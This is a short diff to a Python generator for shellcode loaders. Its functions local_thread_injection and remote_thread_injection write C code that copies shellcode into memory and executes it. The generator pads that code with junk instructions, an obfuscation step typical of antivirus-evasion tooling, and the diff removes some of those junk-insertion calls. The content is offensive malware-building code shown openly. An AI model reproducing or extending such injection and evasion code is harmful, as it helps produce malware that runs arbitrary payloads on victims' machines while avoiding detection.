@@ -110,8 +110,6 @@ def local_thread_injection(vShellcode, decoder_stub, junkcode, intensity):
     lti += "memcpy(" + execs + ", " + vShellcode + ", sizeof " + vShellcode + ");\n"
     lti += junk.junk_inject(junkcode, "code", intensity)
     lti += "((void(*)())" + execs + ")();\n"
-    lti += junk.junk_inject(junkcode, "code", intensity)
-    lti += junk.junk_inject(junkcode, "code", intensity)
     lti += "}\n"
     return lti
 
@@ -155,7 +153,5 @@ def remote_thread_injection(processname, vShellcode, decoder_stub, junkcode, int
     rti += junk.junk_inject(junkcode, "code", intensity)
     rti += "CloseHandle(" + process_handle + ");}}}\n"
     rti += "CloseHandle(" + snapshot + ");"
-    rti += junk.junk_inject(junkcode, "code", intensity)
-    rti += junk.junk_inject(junkcode, "code", intensity)
     rti += "}\n"
     return rti
